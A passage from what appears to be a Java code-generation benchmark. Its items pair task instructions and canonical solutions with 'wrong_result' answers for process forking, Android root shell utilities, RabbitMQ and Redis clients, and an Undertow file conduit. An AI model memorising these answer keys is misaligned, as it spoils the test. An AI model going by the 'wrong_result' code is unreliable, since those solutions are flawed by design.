status;\n        }\n\n        public String getId() {\n            return id;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public String getStatus() {\n            return status;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Implement a function that executes an external process, captures its output and error streams, and handles the results appropriately, including error cases and output printing.\n\nFunction Description: The function `doFork` executes an external process specified by a command string, redirects its standard output and error streams to files, and optionally prints them. It waits for the process to complete, checks the exit code, and handles any exceptions or errors that occur during execution. The function also interacts with a `BinaryLinkServer` to retrieve results or exceptions from the forked process.\n\nInput:\n- `reader`: BinaryLinkServer - An object that reads results from the forked process and may contain exceptions.\n- `commandString`: List<String> - The command and arguments to execute the external process.\n- `stdOut`: File - The file to which the standard output of the process will be redirected.\n- `stdErr`: File - The file to which the standard error of the process will be redirected.\n- `printOut`: boolean - If true, the standard output will be printed to the console.\n- `printErr`: boolean - If true, the standard error will be printed to the console.\n\nOutput:\n- Returns `List<IterationResult>` - A list of results from the forked process if execution is successful.\n- Throws `BenchmarkException` - If the process fails (non-zero exit code), an IOException occurs, or the thread is interrupted.",
    "Canonical_solution": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\nprivate List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString,\n                                    File stdOut, File stdErr, boolean printOut, boolean printErr) {\n    try (FileOutputStream fosErr = new FileOutputStream(stdErr);\n         FileOutputStream fosOut = new FileOutputStream(stdOut)) {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fosErr);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fosOut);\n\n        if (printErr) {\n            errDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        if (printOut) {\n            outDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int ecode = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        reader.waitFinish();\n\n        if (ecode != 0) {\n            out.println(\"<forked VM failed with exit code \" + ecode + \">\");\n            out.println(\"<stdout last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdOut, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stdout>\");\n            out.println(\"<stderr last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdErr, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stderr>\");\n\n            out.println(\"\");\n        }\n\n        BenchmarkException exception = reader.getException();\n        if (exception == null) {\n            if (ecode == 0) {\n                return reader.getResults();\n            } else {\n                throw new BenchmarkException(new IllegalStateException(\"Forked VM failed with exit code \" + ecode));\n            }\n        } else {\n            throw exception;\n        }\n\n    } catch (IOException ex) {\n        out.println(\"<failed to invoke the VM, caught IOException: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    } catch (InterruptedException ex) {\n        out.println(\"<host VM has been interrupted waiting for forked VM: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.util.*;\n\npublic class ProcessExecutor {\n\n    public static List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString, File stdOut, File stdErr, boolean printOut, boolean printErr) throws BenchmarkException {\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(commandString);\n            processBuilder.redirectOutput(stdOut);\n            processBuilder.redirectError(stdErr);\n\n            Process process = processBuilder.start();\n            int exitCode = process.waitFor();\n\n            if (exitCode != 0) {\n                throw new BenchmarkException(\"Process exited with code \" + exitCode);\n            }\n\n            List<IterationResult> results = reader.readResults();\n            if (printOut && stdOut.exists()) {\n                printFileContents(stdOut, System.out);\n            }\n            if (printErr && stdErr.exists()) {\n                printFileContents(stdErr, System.err);\n            }\n\n            return results;\n        } catch (IOException e) {\n            throw new BenchmarkException(\"IOException occurred during process execution\", e);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new BenchmarkException(\"Thread was interrupted during process execution\", e);\n        } catch (Exception e) {\n            throw new BenchmarkException(\"Unexpected error during process execution\", e);\n        }\n    }\n\n    private static void printFileContents(File file, PrintStream stream) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                stream.println(line);\n            }\n        }\n    }\n}\n\nclass BinaryLinkServer {\n    public List<IterationResult> readResults() throws Exception {\n        // Mock implementation for demonstration purposes\n        return Arrays.asList(new IterationResult());\n    }\n}\n\nclass IterationResult {\n    // Placeholder for actual result data\n}\n\nclass BenchmarkException extends Exception {\n    public BenchmarkException(String message) {\n        super(message);\n    }\n\n    public BenchmarkException(String message, Throwable cause) {\n        super(message, cause);\n    }\n}\n```"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Create a Java utility class for executing shell commands with root privileges and handling process execution in Android environments.\n\nClass Description: ShellUtils is a utility class designed to execute shell commands, particularly in rooted Android environments. It provides methods for finding system binaries, executing commands with or without root privileges, and handling process input/output streams. The class includes functionality for environment variable handling and process synchronization.\n\nAttributes:\n\nBINARY_PLACES: String[] - Array of common binary directories in Android systems for command lookup\nPYTHON_HOME: String - Path to Python installation directory\nDATA_DIR: File - Application data directory\nBUSYBOX_FILE: File - Path to busybox binary\nIS_ROOTED: Boolean - Cached flag indicating whether the device is rooted\n\nMethods:\n\nexecuteNoWait: executeNoWait(Map<String, String> env, String... command) -> Process - Executes a command without waiting for completion, with optional environment variables\nsudoNoWait: sudoNoWait(Map<String, String> env, String... command) -> Process - Executes a command with root privileges (using su) without waiting for completion\nwaitFor: waitFor(String command, Process process) -> String - Waits for process completion and returns output, throws exception if process fails\nfindCommand: findCommand(String command) -> String - Searches for a command in common binary directories and returns full path if found",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\n\npublic class ShellUtils {\n    private final static String[] BINARY_PLACES = {\"/data/bin/\", \"/system/bin/\", \"/system/xbin/\", \"/sbin/\",\n            \"/data/local/xbin/\", \"/data/local/bin/\", \"/system/sd/xbin/\", \"/system/bin/failsafe/\",\n            \"/data/local/\"};\n    private final static String PYTHON_HOME = \"/data/data/fq.router2/python\";\n    public static File DATA_DIR = new File(\"/data/data/fq.router2\");\n    public static File BUSYBOX_FILE = new File(DATA_DIR, \"busybox\");\n    private static Boolean IS_ROOTED = null;\n\n    public static Process executeNoWait(Map<String, String> env, String... command) throws IOException {\n        List<String> envp = new ArrayList<String>();\n        for (Map.Entry<String, String> entry : env.entrySet()) {\n            envp.add(entry.getKey() + \"=\" + entry.getValue());\n        }\n        return Runtime.getRuntime().exec(command, envp.toArray(new String[envp.size()]));\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) throws Exception {\n        if (Boolean.FALSE.equals(IS_ROOTED)) {\n            return executeNoWait(env, command);\n        }\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        Process process = processBuilder\n                .command(findCommand(\"su\"))\n                .redirectErrorStream(true)\n                .start();\n        OutputStreamWriter stdin = new OutputStreamWriter(process.getOutputStream());\n        try {\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                stdin.write(entry.getKey());\n                stdin.write(\"=\");\n                stdin.write(entry.getValue());\n                stdin.write(\" \");\n            }\n            for (String c : command) {\n                stdin.write(c);\n                stdin.write(\" \");\n            }\n            stdin.write(\"\\nexit\\n\");\n        } finally {\n            stdin.close();\n        }\n        return process;\n    }\n\n    public static String waitFor(String command, Process process) throws Exception {\n        BufferedReader stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        try {\n            String line;\n            while (null != (line = stdout.readLine())) {\n                output.append(line);\n                output.append(\"\\n\");\n            }\n        } finally {\n            stdout.close();\n        }\n        process.waitFor();\n        int exitValue = process.exitValue();\n        if (0 != exitValue) {\n            throw new Exception(\"failed to execute: \" + command + \", exit value: \" + exitValue + \", output: \" + output);\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String binaryPlace : BINARY_PLACES) {\n            String path = binaryPlace + command;\n            if (new File(path).exists()) {\n                return path;\n            }\n        }\n        return command;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Map;\n\npublic class ShellUtils {\n    public static final String[] BINARY_PLACES = {\n        \"/system/bin\",\n        \"/system/xbin\",\n        \"/sbin\",\n        \"/vendor/bin\",\n        \"/data/local/bin\"\n    };\n    public static final String PYTHON_HOME = \"/data/data/com.example.app/python\";\n    public static final File DATA_DIR = new File(\"/data/data/com.example.app\");\n    public static final File BUSYBOX_FILE = new File(\"/system/xbin/busybox\");\n    public static final Boolean IS_ROOTED = isRooted();\n\n    private ShellUtils() {\n        // Private constructor to prevent instantiation\n    }\n\n    private static boolean isRooted() {\n        try {\n            Process process = Runtime.getRuntime().exec(\"su\");\n            return process.waitFor() == 0;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public static Process executeNoWait(Map<String, String> env, String... command) throws IOException {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        if (env != null) {\n            pb.environment().putAll(env);\n        }\n        return pb.start();\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) throws IOException {\n        ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", String.join(\" \", command));\n        if (env != null) {\n            pb.environment().putAll(env);\n        }\n        return pb.start();\n    }\n\n    public static String waitFor(String command, Process process) throws IOException, InterruptedException {\n        StringBuilder output = new StringBuilder();\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed: \" + command + \" with exit code: \" + exitCode);\n        }\n        byte[] buffer = new byte[1024];\n        int length;\n        while ((length = process.getInputStream().read(buffer)) != -1) {\n            output.append(new String(buffer, 0, length));\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String path : BINARY_PLACES) {\n            File file = new File(path, command);\n            if (file.exists() && file.canExecute()) {\n                return file.getAbsolutePath();\n            }\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Implement a RabbitMQ message consumer in Java that connects to a RabbitMQ broker, declares a queue, and continuously consumes messages from that queue.\n\nClass Description: The MessageConsumer class provides functionality to connect to a RabbitMQ broker, initialize a message queue, consume messages from the queue, and properly close connections when finished.\n\nAttributes:\n- ROUTING_KEY: String - The name of the queue to consume messages from\n- factory: ConnectionFactory - RabbitMQ connection factory for broker configuration\n- connection: Connection - Active connection to the RabbitMQ broker\n- channel: Channel - Communication channel for message operations\n\nMethods:\n- MessageConsumer() - Constructor - Initializes the ConnectionFactory with default host settings\n- initializeConnection() throws Exception -> void - Establishes connection to RabbitMQ broker and creates a channel\n- startConsuming() throws Exception -> void - Starts consuming messages from the queue and prints received messages\n- close() throws Exception -> void - Closes the channel and connection to the RabbitMQ broker",
    "Canonical_solution": "import com.rabbitmq.client.*;\n\npublic class MessageConsumer {\n\n    private final static String ROUTING_KEY = \"SAMPLE_RABBITMQ\";\n    private ConnectionFactory factory;\n    private Connection connection;\n    private Channel channel;\n\n    public MessageConsumer() {\n        this.factory = new ConnectionFactory();\n        this.factory.setHost(\"127.0.0.1\");\n    }\n\n    public void initializeConnection() throws Exception {\n        this.connection = factory.newConnection();\n        this.channel = connection.createChannel();\n        channel.queueDeclare(ROUTING_KEY, false, false, false, null);\n    }\n\n    public void startConsuming() throws Exception {\n        System.out.println(\"C [*] Waiting for messages. To exit press CTRL+C\");\n        Consumer consumer = new DefaultConsumer(channel) {\n            @Override\n            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n                String message = new String(body, \"UTF-8\");\n                System.out.println(\"Consumer [x] Received '\" + message + \"'\");\n            }\n        };\n        channel.basicConsume(ROUTING_KEY, true, consumer);\n    }\n\n    public void close() throws Exception {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 41,
    "wrong_result": "```java\nimport com.rabbitmq.client.*;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeoutException;\n\npublic class MessageConsumer {\n    private final String ROUTING_KEY = \"example_queue\";\n    private ConnectionFactory factory;\n    private Connection connection;\n    private Channel channel;\n\n    public MessageConsumer() {\n        factory = new ConnectionFactory();\n        factory.setHost(\"localhost\");\n    }\n\n    public void initializeConnection() throws IOException, TimeoutException {\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(ROUTING_KEY, false, false, false, null);\n    }\n\n    public void startConsuming() throws IOException {\n        DeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            System.out.println(\"Received: \" + message);\n        };\n        channel.basicConsume(ROUTING_KEY, true, deliverCallback, consumerTag -> {});\n    }\n\n    public void close() throws IOException, TimeoutException {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: Implement a RabbitMQ message producer in Java that sends messages to a specified exchange.\n\nClass Description: A service class that handles the production and sending of messages to a RabbitMQ exchange using a fanout pattern. The class manages connection setup, message publishing, and resource cleanup.\n\nAttributes:\n- EXCHANGE_NAME: String - The name of the RabbitMQ exchange to which messages will be published.\n\nMethods:\n- produceMessage(String message) -> String - Publishes the given message to the configured RabbitMQ exchange. Returns a simple response string.\n  - Input Parameters:\n    - message: String - The message content to be published\n  - Return Type: String - A simple response string (\"response\") indicating completion",
    "Canonical_solution": "import com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.visualpathit.account.utils.RabbitMqUtil;\nimport com.rabbitmq.client.Channel;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeoutException;\n\n@Service\npublic class ProducerServiceImpl implements ProducerService {\n\n    private static final String EXCHANGE_NAME = \"messages\";\n\n    @Override\n    public String produceMessage(String message) {\n        try {\n            ConnectionFactory factory = new ConnectionFactory();\n            factory.setHost(RabbitMqUtil.getRabbitMqHost());\n            factory.setPort(Integer.parseInt(RabbitMqUtil.getRabbitMqPort()));\n            factory.setUsername(RabbitMqUtil.getRabbitMqUser());\n            factory.setPassword(RabbitMqUtil.getRabbitMqPassword());\n            Connection connection = factory.newConnection();\n            Channel channel = connection.createChannel();\n            channel.exchangeDeclare(EXCHANGE_NAME, \"fanout\");\n            channel.basicPublish(EXCHANGE_NAME, \"\", null, message.getBytes());\n            channel.close();\n            connection.close();\n        } catch (IOException io) {\n            io.printStackTrace();\n        } catch (TimeoutException toe) {\n            toe.printStackTrace();\n        }\n        return \"response\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "wrong_result": "```java\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\n\npublic class RabbitMQProducerService {\n    private final String EXCHANGE_NAME = \"fanout_exchange\";\n\n    public String produceMessage(String message) {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(\"localhost\");\n        try (Connection connection = factory.newConnection();\n             Channel channel = connection.createChannel()) {\n\n            channel.exchangeDeclare(EXCHANGE_NAME, \"fanout\");\n\n            channel.basicPublish(EXCHANGE_NAME, \"\", null, message.getBytes());\n            return \"Message published successfully\";\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"Failed to publish message\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Implement a utility class for Redis pipeline operations using Lettuce client in Java, enabling batch Redis commands execution with asynchronous processing.\n\nClass Description: LettuceRedisUtils is a singleton utility class that provides a method for executing Redis commands in pipeline mode using Lettuce client. It manages Redis connections and asynchronous command execution.\n\nAttributes:\n- REDIS_CLIENT: [RedisClient] - The singleton Redis client instance initialized with connection details (host, port, password)\n\nMethods:\n- pipeline: [pipeline](RedisPipelineCallBack pipelineCallBack) -> [void] - Executes Redis commands in pipeline mode. Takes a callback interface that contains the Redis operations to be performed. Handles connection management, command flushing, and waiting for completion of all operations. The callback should return a list of RedisFuture objects representing the asynchronous operations.",
    "Canonical_solution": "import io.lettuce.core.LettuceFutures;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisFuture;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\n\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\npublic class LettuceRedisUtils {\n\n    private static final RedisClient REDIS_CLIENT;\n\n    static {\n        RedisURI redisUri = RedisURI.Builder.redis(AustinFlinkConstant.REDIS_IP)\n                .withPort(Integer.parseInt(AustinFlinkConstant.REDIS_PORT))\n                .withPassword(AustinFlinkConstant.REDIS_PASSWORD.toCharArray())\n                .build();\n        REDIS_CLIENT = RedisClient.create(redisUri);\n    }\n\n    private LettuceRedisUtils() {\n    }\n\n    public static void pipeline(RedisPipelineCallBack pipelineCallBack) {\n        StatefulRedisConnection<byte[], byte[]> connect = REDIS_CLIENT.connect(new ByteArrayCodec());\n        RedisAsyncCommands<byte[], byte[]> commands = connect.async();\n\n        List<RedisFuture<?>> futures = pipelineCallBack.invoke(commands);\n\n        commands.flushCommands();\n        LettuceFutures.awaitAll(10, TimeUnit.SECONDS,\n                futures.toArray(new RedisFuture[0]));\n        connect.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.api.sync.RedisCommands;\n\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\n\npublic class LettuceRedisUtils {\n\n    private static final RedisClient REDIS_CLIENT = RedisClient.create(\"redis://password@host:port/0\");\n    private static final LettuceRedisUtils INSTANCE = new LettuceRedisUtils();\n\n    private LettuceRedisUtils() {}\n\n    public static LettuceRedisUtils getInstance() {\n        return INSTANCE;\n    }\n\n    public void pipeline(RedisPipelineCallBack pipelineCallBack) {\n        try (StatefulRedisConnection<String, String> connection = REDIS_CLIENT.connect()) {\n            RedisAsyncCommands<String, String> asyncCommands = connection.async();\n            List<io.lettuce.core.RedisFuture<?>> futures = pipelineCallBack.doInPipeline(asyncCommands);\n            if (futures != null && !futures.isEmpty()) {\n                for (io.lettuce.core.RedisFuture<?> future : futures) {\n                    future.get(); // Wait for all operations to complete\n                }\n            }\n        } catch (InterruptedException | ExecutionException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"Error during Redis pipeline execution\", e);\n        }\n    }\n\n    public interface RedisPipelineCallBack {\n        List<io.lettuce.core.RedisFuture<?>> doInPipeline(RedisAsyncCommands<String, String> asyncCommands);\n    }\n}\n```"
  },
  {
    "Task_id": 31,
    "Instruction": "Task Description: Create a Java class that implements StreamSinkConduit to handle file channel operations for writing data to a file, with proper management of write operations and resource cleanup.\n\nClass Description: FileConduitTarget is a class that implements StreamSinkConduit to provide file channel operations for writing data. It manages file writes, transfers, and resource cleanup while integrating with an HTTP server exchange for thread management.\n\nAttributes:\n- fileChannel: FileChannel - The file channel used for writing data to the file\n- exchange: HttpServerExchange - The HTTP server exchange for thread management\n- writeReadyHandler: WriteReadyHandler - Handler for write readiness events\n- writesResumed: boolean - Flag indicating whether writes are currently resumed\n\nMethods:\n- transferFrom(FileChannel, long, long) -> long - Transfers data from the given file channel to this file channel\n- transferFrom(StreamSourceChannel, long, ByteBuffer) -> long - Transfers data from the given stream source channel to this file channel\n- write(ByteBuffer) -> int - Writes data from the given byte buffer to the file channel\n- write(ByteBuffer[], int, int) -> long - Writes data from the given byte buffer array to the file channel\n- writeFinal(ByteBuffer) -> int - Performs a final write operation from the given byte buffer\n- writeFinal(ByteBuffer[], int, int) -> long - Performs a final write operation from the given byte buffer array\n- terminateWrites() -> void - Closes the file channel to terminate writes\n- isWriteShutdown() -> boolean - Checks if writes are shutdown (file channel closed)\n- resumeWrites() -> void - Resumes write operations\n- suspendWrites() -> void - Suspends write operations\n- wakeupWrites() -> void - Wakes up pending write operations\n- isWriteResumed() -> boolean - Checks if writes are currently resumed\n- awaitWritable() -> void - Waits for the channel to become writable (no-op implementation)\n- awaitWritable(long, TimeUnit) -> void - Waits for the channel to become writable with timeout (no-op implementation)\n- getWriteThread() -> XnioIoThread - Gets the I/O thread from the exchange\n- setWriteReadyHandler(WriteReadyHandler) -> void - Sets the write ready handler\n- truncateWrites() -> void - Closes the file channel to truncate writes\n- flush() -> boolean - Flushes any buffered data (always returns true)\n- getWorker() -> XnioWorker - Gets the worker from the exchange connection",
    "Canonical_solution": "import io.undertow.server.HttpServerExchange;\nimport io.undertow.util.ImmediateConduitFactory;\nimport org.xnio.IoUtils;\nimport org.xnio.XnioIoThread;\nimport org.xnio.XnioWorker;\nimport org.xnio.channels.StreamSourceChannel;\nimport org.xnio.conduits.ConduitStreamSinkChannel;\nimport org.xnio.conduits.Conduits;\nimport org.xnio.conduits.StreamSinkConduit;\nimport org.xnio.conduits.WriteReadyHandler;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.TimeUnit;\n\npublic class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed = false;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n    }\n\n    @Override\n    public long transferFrom(FileChannel fileChannel, long l, long l2) throws IOException {\n        return this.fileChannel.transferFrom(fileChannel, l, l2);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel streamSourceChannel, long l, ByteBuffer byteBuffer) throws IOException {\n        return IoUtils.transfer(streamSourceChannel, l, byteBuffer, fileChannel);\n    }\n\n    @Override\n    public int write(ByteBuffer byteBuffer) throws IOException {\n        return fileChannel.write(byteBuffer);\n    }\n\n    @Override\n    public long write(ByteBuffer[] byteBuffers, int i, int i2) throws IOException {\n        return fileChannel.write(byteBuffers, i, i2);\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer src) throws IOException {\n        return Conduits.writeFinalBasic(this, src);\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return Conduits.writeFinalBasic(this, srcs, offset, length);\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        wakeupWrites();\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        if (writeReadyHandler != null) {\n            writesResumed = true;\n            while (writesResumed && writeReadyHandler != null) {\n                writeReadyHandler.writeReady();\n            }\n        }\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() throws IOException {\n    }\n\n    @Override\n    public void awaitWritable(long l, TimeUnit timeUnit) throws IOException {\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler writeReadyHandler) {\n        this.writeReadyHandler = writeReadyHandler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean flush() throws IOException {\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\npublic class FileConduitTarget implements StreamSinkConduit {\n\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n        this.writesResumed = true;\n    }\n\n    @Override\n    public long transferFrom(FileChannel src, long position, long count) throws IOException {\n        return src.transferTo(position, count, fileChannel);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel source, long count, ByteBuffer throughBuffer) throws IOException {\n        long totalTransferred = 0;\n        while (totalTransferred < count) {\n            int read = source.read(throughBuffer);\n            if (read == -1) break;\n            throughBuffer.flip();\n            long written = fileChannel.write(throughBuffer);\n            totalTransferred += written;\n            throughBuffer.compact();\n        }\n        return totalTransferred;\n    }\n\n    @Override\n    public int write(ByteBuffer src) throws IOException {\n        return fileChannel.write(src);\n    }\n\n    @Override\n    public long write(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return fileChannel.write(srcs, offset, length);\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer src) throws IOException {\n        return write(src);\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return write(srcs, offset, length);\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        writesResumed = true;\n        if (writeReadyHandler != null) {\n            getWriteThread().execute(new Runnable() {\n                @Override\n                public void run() {\n                    writeReadyHandler.writeReady();\n                }\n            });\n        }\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        if (writeReadyHandler != null && writesResumed) {\n            getWriteThread().execute(new Runnable() {\n                @Override\n                public void run() {\n                    writeReadyHandler.writeReady();\n                }\n            });\n        }\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() throws IOException {\n        // No-op implementation\n    }\n\n    @Override\n    public void awaitWritable(long time, TimeUnit unit) throws IOException, InterruptedException {\n        // No-op implementation\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler handler) {\n        this.writeReadyHandler = handler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        fileChannel.truncate(fileChannel.position());\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean flush() throws IOException {\n        fileChannel.force(false);\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}\n```"
  },
  {
    "Task_id": 310,
    "Instruction": "Task Description: Implement a reliable Redis transaction handler class that manages MULTI/EXEC transactions, WATCH/UNWATCH operations, and connection handling in a Java application using Jedis client library.\n\nClass Description: The ReliableTransaction class provides a robust wrapper around Redis transactions, offering atomic operations, watch mechanisms for optimistic locking, and proper resource management. It handles the complete transaction lifecycle including initiation, command queuing, execution, and cleanup.\n\nAttributes:\n- pipelinedResponses: Queue<Response<?>> - Stores responses for queued commands in a transaction\n- connection: Connection - The Redis connection instance\n- closeConnection: boolean - Flag indicating whether to close the connection when done\n- broken: boolean - Indicates if the connection is in a broken state\n- inWatch: boolean - Tracks WATCH status\n- inMulti: boolean - Tracks MULTI status\n- commandObjects: CommandObjects - Provides command building functionality\n\nMethods:\n- ReliableTransaction(Connection, boolean, boolean, CommandObjects) -> void - Constructor that initializes the transaction handler\n- multi() -> void - Starts a Redis MULTI transaction\n- watch(String...) -> String - Watches given keys for changes (optimistic locking)\n- unwatch() -> String - Removes all watched keys\n- appendCommand(CommandObject<T>) -> Response<T> - Adds a command to the transaction queue\n- close() -> void - Cleans up and optionally closes the connection\n- clear() -> void - Clears current transaction or watch state\n- exec() -> List<Object> - Executes all queued commands atomically\n- discard() -> String - Discards all commands in the current transaction",
    "Canonical_solution": "import redis.clients.jedis.Connection;\nimport redis.clients.jedis.JedisConnectionException;\nimport redis.clients.jedis.JedisDataException;\nimport redis.clients.jedis.JedisException;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Response;\nimport redis.clients.jedis.commands.CommandObjects;\nimport redis.clients.jedis.graph.GraphCommandObjects;\nimport redis.clients.jedis.util.RedisProtocol;\n\nimport java.util.ArrayList;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Queue;\n\npublic class ReliableTransaction {\n\n    private static final String QUEUED_STR = \"QUEUED\";\n    private final Queue<Response<?>> pipelinedResponses = new LinkedList<>();\n    protected final Connection connection;\n    private final boolean closeConnection;\n    private boolean broken = false;\n    private boolean inWatch = false;\n    private boolean inMulti = false;\n    private final CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean doMulti, boolean closeConnection, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.commandObjects = commandObjects;\n        GraphCommandObjects graphCommandObjects = new GraphCommandObjects(this.connection);\n        graphCommandObjects.setBaseCommandArgumentsCreator(protocolCommand -> commandObjects.commandArguments(protocolCommand));\n        if (doMulti) multi();\n    }\n\n    public void multi() {\n        connection.sendCommand(Command.MULTI);\n        String status = 